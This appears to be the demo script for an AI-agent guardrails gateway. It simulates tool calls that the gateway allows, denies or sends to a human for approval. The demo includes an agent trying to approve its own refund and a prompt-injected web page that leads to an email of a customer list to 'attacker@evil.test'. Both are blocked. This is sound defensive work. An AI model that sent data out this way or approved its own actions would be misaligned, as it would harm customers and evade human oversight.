"""A scripted, offline walkthrough of every guardrail. No API keys, no network.

Run it with `aggw demo`. Each step shows the call an agent makes, what the gateway
decided, and which rule decided it.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Any

from guardrails_gateway.approvals import ApprovalError
from guardrails_gateway.config import DEFAULT_POLICY, Settings, build_gateway
from guardrails_gateway.gateway import Gateway
from guardrails_gateway.models import ToolCall

COLORS = {"allow": "32", "deny": "31", "require_approval": "33", "info": "36", "fail": "31"}


def _paint(text: str, kind: str) -> str:
    if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
        return text
    return f"\033[{COLORS.get(kind, '0')}m{text}\033[0m"


class Demo:
    def __init__(self, gateway: Gateway, out: Any = sys.stdout) -> None:
        self.gw = gateway
        self.out = out
        self.step = 0
        self.results: list[tuple[str, str]] = []

    def say(self, text: str) -> None:
        print(text, file=self.out)

    def call(self, title: str, tool: str, args: dict[str, Any], grant: str, session: str) -> str:
        self.step += 1
        call = ToolCall(
            agent_id="support-agent",
            task_id="T-42",
            session_id=session,
            tool=tool,
            arguments=args,
        )
        res = self.gw.invoke(call, grant)
        outcome = res.decision.outcome.value
        self.results.append((title, outcome))
        self.say(f"\n{self.step:>2}. {title}")
        self.say(f"    call    {tool}({json.dumps(args)})")
        label = f"{outcome.upper():<17} rule={res.decision.rule}"
        self.say(f"    result  {_paint(label, outcome)}")
        self.say(f"    why     {res.decision.reason}")
        if res.result is not None:
            self.say(f"    output  {json.dumps(res.result)[:110]}")
        return res.decision.approval_id or ""


def run(data_dir: Path, policy: Path = DEFAULT_POLICY, out: Any = sys.stdout) -> Demo:
    settings = Settings(
        policy_path=policy,
        data_dir=data_dir,
        grant_secret=b"demo-secret-demo-secret-demo-secret!",
        audit_key=b"demo-audit-key",
        admin_token="demo",  # noqa: S106 - demo only
        demo_tools=True,
    )
    gw = build_gateway(settings)
    d = Demo(gw, out)
    d.say(_paint("Agent Guardrails Gateway - offline demo", "info"))
    d.say("Agent: support-agent   Task: T-42   Policy: " + policy.name)

    grant = gw.issue_grant(
        "support-agent",
        "T-42",
        ["search_docs", "read_invoice", "web_fetch", "send_email", "refund_payment"],
        ttl_seconds=900,
        issued_by="orchestrator",
    )
    d.say("Grant issued for 15 minutes covering 5 tools (delete_record not included).")

    d.call(
        "Low-risk lookup goes straight through",
        "search_docs",
        {"query": "refund policy"},
        grant,
        "s1",
    )
    d.call(
        "Tool outside the task grant is denied",
        "delete_record",
        {"record_id": "CUST-9"},
        grant,
        "s1",
    )
    d.call(
        "Refund above the agent's limit is denied",
        "refund_payment",
        {"invoice_id": "INV-1002", "amount": 2400, "currency": "EUR"},
        grant,
        "s1",
    )
    approval_id = d.call(
        "Refund within limit still needs a human (high risk)",
        "refund_payment",
        {"invoice_id": "INV-1001", "amount": 120, "currency": "USD"},
        grant,
        "s1",
    )

    d.step += 1
    d.say(f"\n{d.step:>2}. The agent tries to approve its own refund")
    try:
        gw.decide_approval(approval_id, True, decided_by="support-agent")
        d.say("    " + _paint("UNEXPECTED: self-approval accepted", "fail"))
        d.results.append(("Self-approval is rejected", "fail"))
    except ApprovalError as exc:
        d.say(f"    result  {_paint('REJECTED', 'deny')}  {exc}")
        d.results.append(("Self-approval is rejected", "deny"))

    gw.decide_approval(
        approval_id, True, decided_by="finance-lead@example.com", note="Duplicate charge confirmed"
    )
    d.say(f"\n    finance-lead@example.com approved {approval_id}")
    d.call(
        "Identical call after approval is allowed and runs",
        "refund_payment",
        {"invoice_id": "INV-1001", "amount": 120, "currency": "USD"},
        grant,
        "s1",
    )
    d.call(
        "Replaying the same refund needs a new approval (single use)",
        "refund_payment",
        {"invoice_id": "INV-1001", "amount": 120, "currency": "USD"},
        grant,
        "s1",
    )

    d.call(
        "Email to a customer in a clean session is allowed",
        "send_email",
        {"to": "acme@example.com", "subject": "Your refund"},
        grant,
        "s2",
    )
    d.call(
        "Agent reads a web page carrying a prompt injection",
        "web_fetch",
        {"url": "https://shipping.example.org/faq"},
        grant,
        "s2",
    )
    d.call(
        "Injected exfiltration to an outside address is denied",
        "send_email",
        {"to": "attacker@evil.test", "subject": "customer list"},
        grant,
        "s2",
    )
    d.call(
        "Even a legit email now needs a human: the session is tainted",
        "send_email",
        {"to": "acme@example.com", "subject": "Follow-up"},
        grant,
        "s2",
    )

    gw.revoke_task("T-42", revoked_by="security-oncall")
    d.say("\n    security-oncall revoked task T-42 (kill switch)")
    d.call(
        "Every call under a revoked task is denied",
        "search_docs",
        {"query": "anything"},
        grant,
        "s1",
    )

    d.step += 1
    d.say(f"\n{d.step:>2}. Audit trail integrity")
    ok = gw.audit.verify()
    d.say(f"    verify  ok={ok.ok} records={ok.records} head={ok.head[:16]}...")
    _tamper(gw.audit.path)
    bad = gw.audit.verify()
    d.say("    someone edits the logged refund amount from 120 to 12...")
    d.say(
        f"    verify  {_paint(f'ok={bad.ok}', 'deny')} first_bad_seq={bad.first_bad_seq} "
        f"reason={bad.reason}"
    )
    d.results.append(("Tampering is detected", "deny" if not bad.ok else "fail"))

    counts: dict[str, int] = {}
    for _, outcome in d.results:
        counts[outcome] = counts.get(outcome, 0) + 1
    d.say("\nSummary: " + ", ".join(f"{k}={v}" for k, v in sorted(counts.items())))
    return d


def _tamper(path: Path) -> None:
    lines = path.read_text(encoding="utf-8").splitlines()
    for i, line in enumerate(lines):
        record = json.loads(line)
        args = record.get("data", {}).get("arguments", {})
        if record["event"] == "decision" and args.get("amount") == 120:
            args["amount"] = 12
            lines[i] = json.dumps(record, sort_keys=True)
            break
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        run(Path(tmp)).gw.close()
